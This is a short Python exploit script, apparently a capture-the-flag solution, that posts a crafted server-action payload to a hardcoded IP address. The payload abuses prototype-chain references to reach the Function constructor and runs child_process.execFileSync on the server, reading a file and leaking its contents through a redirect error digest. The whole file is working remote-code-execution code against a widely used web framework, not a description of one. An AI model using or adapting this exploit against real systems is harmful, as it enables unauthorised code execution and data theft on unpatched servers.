#!/usr/bin/env python3

from __future__ import annotations

import base64
import json
import re
from pathlib import Path

import requests


TARGET = "http://34.40.133.67:8080/"
OUTPUT_DIR = Path("old-web-raw")
OUTPUT_FILE = OUTPUT_DIR / "result.json"
FLAG_PATTERN = re.compile(rb"bushbash\{[^\r\n\x00}]{1,256}\}")


def main() -> None:
    command = "cat /app/zoowee_message.txt"
    prefix = (
        "var res=process.mainModule.require('child_process')"
        ".execFileSync('/bin/cat',['/app/zoowee_message.txt'],"
        "{timeout:5000,maxBuffer:65536}).toString().trim();"
        "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:res});"
    )

    crafted_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B0"}',
        "_response": {
            "_prefix": prefix,
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }

    response = requests.post(
        TARGET,
        files={
            "0": (None, json.dumps(crafted_chunk, separators=(",", ":"))),
            "1": (None, '"$@0"'),
        },
        headers={
            "Next-Action": "x",
            "User-Agent": "Mozilla/5.0 (compatible; BushBash-CTF-final-read/1.0)",
            "Connection": "close",
        },
        timeout=(5, 12),
        allow_redirects=False,
    )

    flags = sorted(
        {
            match.group(0).decode("ascii", errors="replace")
            for match in FLAG_PATTERN.finditer(response.content)
        }
    )

    result = {
        "target": TARGET,
        "command": command,
        "status": response.status_code,
        "headers": dict(response.headers),
        "body_b64": base64.b64encode(response.content[:65536]).decode("ascii"),
        "flags": flags,
    }

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    OUTPUT_FILE.write_text(json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8")

    if len(flags) != 1:
        raise RuntimeError(f"Expected one BushBash flag, found {len(flags)}")


if __name__ == "__main__":
    main()
